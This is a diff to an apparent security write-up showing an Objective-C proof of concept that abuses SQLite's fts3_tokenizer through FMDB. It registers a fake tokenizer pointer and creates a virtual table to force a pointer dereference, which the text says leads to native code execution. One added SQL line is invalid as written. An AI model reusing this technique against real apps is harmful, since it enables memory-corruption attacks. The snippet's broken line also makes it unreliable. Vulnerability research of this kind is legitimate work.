@@ -125,9 +125,10 @@ while ([s next]) {
 If the second argument is given, it registers a new tokenizer and the argument is the address of a virtual function table. This will lead to native code execution via SQLite3 callbacks:
 
 ```objectivec
-FMResultSet *s1 = [db executeQuery:@"select fts3_tokenizer('simple', x'4141414141414141');"];
-FMResultSet *s2 = [db executeQuery:@"create virtual table a using fts3;"];
-NSLog(@"%d", [s2 next]); // the application will crash here
+[db executeUpdate:@"select fts3_tokenizer('simple', x'4141414141414141');"]; // a fake virtual table
+[db executeUpdate:@"drop table a if exists;"]; // in case the virtual table already extst
+FMResultSet *result = [db executeQuery:@"create virtual table a using fts3;"];
+NSLog(@"%d", [result next]); // trigger pointer dereference
 ```
 
 The crash information:
